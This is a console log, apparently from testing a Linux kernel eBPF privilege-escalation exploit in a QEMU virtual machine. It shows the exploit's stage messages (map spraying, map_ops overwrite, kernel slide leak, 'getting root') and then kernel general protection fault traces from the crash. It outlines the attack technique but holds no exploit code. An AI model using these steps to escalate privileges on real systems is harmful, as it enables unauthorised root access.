sudo ./exploit  
[+] eBPF enabled, ringbuf created!
[!] staring to create new maps until we get two consecutive maps
[+] created map 1
[+] generated random value: 33d4b073220eb176
[+] created map 2
[+] generated random value: 6ea3724b8e7b23a7
[+] two new maps created!
[+] value read from slab: 6ea3724b8e7b23a7
[+] aligned map found in map 1
1: 33d4b073220eb176
2: 6ea3724b8e7b23a7
[+] closing unnecessary_maps 
[+] found map address: 0xffff9a57c2f09400
[+] overriding map_ops
[+] detected kernel slide 34c00000
[+] setting spin_lock = 0
[+] setting max_entries = 0xffffffff
[+] setting map_type = BPF_MAP_TYPE_STACK
[+] getting root
[+] iterating over task_struct list to find out process
[  544.734332] general protection fault, probably for non-canonical address 0xf000ff53f001005b: 0000 [#2] SMP NOPTI
[  544.735025] CPU: 0 PID: 456 Comm: exploit Tainted: G      D W         5.13.0-27-generic #29~20.04.1-Ubuntu
[  544.735691] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  544.736364] RIP: 0010:btf_obj_id+0x6/0x10
[  544.736645] Code: c7 c4 fe ff ff ff 48 83 c4 08 44 89 e0 41 5c 5d c3 31 f6 e8 5c a0 37 00 eb 9d 89 c2 eb 82 66 0f 1f 44 00 00 0f 1f 44 00 00 55 <8b> 47 58 48 89 e5 5d c3 66 90 0f 1f 44 00 00 55 0f b6 87 b8 00 00
[  544.737916] RSP: 0018:ffffb69e80513d40 EFLAGS: 00010286
[  544.738275] RAX: 0000000000000000 RBX: 0000000000000000 RCX: 0000000000000000
[  544.738762] RDX: 0000000000000000 RSI: 0000000000000050 RDI: f000ff53f0010003
[  544.739248] RBP: ffffb69e80513e08 R08: 0000000000000050 R09: ffffffffb7a65760
[  544.739735] R10: 0000000000000000 R11: 0000000000000000 R12: 00007ffc88957ce0
[  544.740222] R13: ffff9a57c2dcf600 R14: ffff9a57c2dcf600 R15: ffff9a57c2f09400
[  544.740709] FS:  00007ffb0ce42b80(0000) GS:ffff9a583dc00000(0000) knlGS:0000000000000000
[  544.741260] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  544.741654] CR2: 00007ffb0cf43920 CR3: 0000000008baa002 CR4: 0000000000770ef0
[  544.742154] PKRU: 55555554
[  544.742344] Call Trace:
[  544.742517]  ? bpf_obj_get_info_by_fd+0x2bc/0x3c0
[  544.742852]  ? memcg_slab_free_hook+0x12b/0x230
[  544.743165]  __do_sys_bpf+0x6aa/0x1b30
[  544.743425]  __x64_sys_bpf+0x1a/0x20
[  544.743682]  do_syscall_64+0x61/0xb0
[  544.743936]  ? __x64_sys_close+0x12/0x40
[  544.744208]  ? do_syscall_64+0x6e/0xb0
[  544.744469]  ? do_syscall_64+0x6e/0xb0
[  544.744735]  ? sysvec_apic_timer_interrupt+0x4e/0x90
[  544.745081]  ? asm_sysvec_apic_timer_interrupt+0xa/0x20
[  544.745441]  entry_SYSCALL_64_after_hwframe+0x44/0xae
[  544.745797] RIP: 0033:0x7ffb0cf70fc9
[  544.746047] Code: 00 c3 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 44 00 00 48 89 f8 48 89 f7 48 89 d6 48 89 ca 4d 89 c2 4d 89 c8 4c 8b 4c 24 08 0f 05 <48> 3d 01 f0 ff ff 73 01 c3 48 8b 0d 97 8e 0d 00 f7 d8 64 89 01 48
[  544.747318] RSP: 002b:00007ffc88957cc8 EFLAGS: 00000283 ORIG_RAX: 0000000000000141
[  544.747848] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ffb0cf70fc9
[  544.748332] RDX: 0000000000000078 RSI: 00007ffc88957d30 RDI: 000000000000000f
[  544.748836] RBP: 00007ffc88957db0 R08: 00007ffc88757bd0 R09: 00007ffc88957e14
[  544.749318] R10: 0000000000000004 R11: 0000000000000283 R12: 0000555df3328190
[  544.749809] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  544.750298] Modules linked in:
[  544.750525] ---[ end trace 2b498f1fd9136cae ]---
[  544.750857] RIP: 0010:watchdog+0x102/0x440
[  544.751142] Code: 49 8d 87 e8 f7 ff ff 49 81 ff 58 b1 a1 b7 48 89 45 c8 0f 84 af 01 00 00 48 69 c2 fa 00 00 00 48 89 45 c0 49 8b 87 40 03 00 00 <48> 8b 50 10 48 83 c0 10 4c 8d aa 20 f6 ff ff 48 39 d0 0f 84 47 02
[  544.752431] RSP: 0018:ffffb69e800efec8 EFLAGS: 00010293
[  544.752798] RAX: f000ff53f000ff53 RBX: 0000000000000019 RCX: 00000000003fffb5
[  544.753323] RDX: ffff9a57c4b11f90 RSI: fffffffeffff4c19 RDI: 0000000000000007
[  544.753827] RBP: ffffb69e800eff08 R08: 0000000000000001 R09: 0000000000000001
[  544.754313] R10: 0000000000000000 R11: 0000000000000000 R12: 000000010000b400
[  544.754809] R13: ffff9a57c4b115b0 R14: 00000000003fffb5 R15: ffff9a57c0000000
[  544.755295] FS:  00007ffb0ce42b80(0000) GS:ffff9a583dc00000(0000) knlGS:0000000000000000
[  544.755854] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  544.756247] CR2: 00007ffb0cf43920 CR3: 0000000008baa002 CR4: 0000000000770ef0
[  544.756743] PKRU: 55555554
[  544.757175] general protection fault, probably for non-canonical address 0xf000ff53f0010057: 0000 [#3] SMP NOPTI
[  544.757993] CPU: 1 PID: 456 Comm: exploit Tainted: G      D W         5.13.0-27-generic #29~20.04.1-Ubuntu
[  544.758753] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  544.759526] RIP: 0010:btf_put+0x1d/0x80
[  544.759837] Code: 66 2e 0f 1f 84 00 00 00 00 00 0f 1f 00 0f 1f 44 00 00 48 85 ff 74 26 55 b8 ff ff ff ff 48 89 e5 41 54 53 48 89 fb 48 8d 7f 54 <f0> 0f c1 43 54 83 f8 01 74 0a 85 c0 7e 48 5b 41 5c 5d c3 c3 48 c7
[  544.761300] RSP: 0018:ffffb69e80513e20 EFLAGS: 00010286
[  544.761715] RAX: 00000000ffffffff RBX: f000ff53f0010003 RCX: 0000000000000000
[  544.762273] RDX: 0000000000000002 RSI: 0000000000000202 RDI: f000ff53f0010057
[  544.762835] RBP: ffffb69e80513e30 R08: ffff9a57c2f09400 R09: ffff9a57c8d86490
[  544.763394] R10: 0000000000000000 R11: ffff9a57c8d864f8 R12: ffff9a57c2f09400
[  544.763955] R13: ffff9a57c2264000 R14: ffff9a57c11ddde0 R15: ffff9a57c6788b40
[  544.764513] FS:  0000000000000000(0000) GS:ffff9a583dd00000(0000) knlGS:0000000000000000
[  544.765152] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  544.765603] CR2: 00007fb8335d0110 CR3: 0000000047210002 CR4: 0000000000770ee0
[  544.766168] PKRU: 55555554
[  544.766386] Call Trace:
[  544.766584]  __bpf_map_put.constprop.0+0x2b/0x80
[  544.766953]  bpf_map_release+0x37/0x40
[  544.767251]  __fput+0x9c/0x250
[  544.767496]  ____fput+0xe/0x10
[  544.767746]  task_work_run+0x70/0xb0
[  544.768031]  do_exit+0x37b/0xaf0
[  544.768289]  ? __x64_sys_bpf+0x1a/0x20
[  544.768587]  ? do_syscall_64+0x61/0xb0
[  544.768889]  ? __x64_sys_close+0x12/0x40
[  544.769201]  rewind_stack_do_exit+0x17/0x20
[  544.769534] RIP: 0033:0x7ffb0cf70fc9
[  544.769823] Code: Unable to access opcode bytes at RIP 0x7ffb0cf70f9f.
[  544.770334] RSP: 002b:00007ffc88957cc8 EFLAGS: 00000283 ORIG_RAX: 0000000000000141
[  544.770928] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 00007ffb0cf70fc9
[  544.771486] RDX: 0000000000000078 RSI: 00007ffc88957d30 RDI: 000000000000000f
[  544.772047] RBP: 00007ffc88957db0 R08: 00007ffc88757bd0 R09: 00007ffc88957e14
[  544.772604] R10: 0000000000000004 R11: 0000000000000283 R12: 0000555df3328190
[  544.773164] R13: 0000000000000000 R14: 0000000000000000 R15: 0000000000000000
[  544.773724] Modules linked in:
[  544.773979] ---[ end trace 2b498f1fd9136caf ]---
[  544.774343] RIP: 0010:watchdog+0x102/0x440
[  544.774670] Code: 49 8d 87 e8 f7 ff ff 49 81 ff 58 b1 a1 b7 48 89 45 c8 0f 84 af 01 00 00 48 69 c2 fa 00 00 00 48 89 45 c0 49 8b 87 40 03 00 00 <48> 8b 50 10 48 83 c0 10 4c 8d aa 20 f6 ff ff 48 39 d0 0f 84 47 02
[  544.776138] RSP: 0018:ffffb69e800efec8 EFLAGS: 00010293
[  544.776552] RAX: f000ff53f000ff53 RBX: 0000000000000019 RCX: 00000000003fffb5
[  544.777122] RDX: ffff9a57c4b11f90 RSI: fffffffeffff4c19 RDI: 0000000000000007
[  544.777707] RBP: ffffb69e800eff08 R08: 0000000000000001 R09: 0000000000000001
[  544.778268] R10: 0000000000000000 R11: 0000000000000000 R12: 000000010000b400
[  544.778833] R13: ffff9a57c4b115b0 R14: 00000000003fffb5 R15: ffff9a57c0000000
[  544.779395] FS:  0000000000000000(0000) GS:ffff9a583dd00000(0000) knlGS:0000000000000000
[  544.780034] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
[  544.780498] CR2: 00007fb8335d0110 CR3: 0000000047210002 CR4: 0000000000770ee0
[  544.781063] PKRU: 55555554
[  544.781293] Fixing recursive fault but reboot is needed!
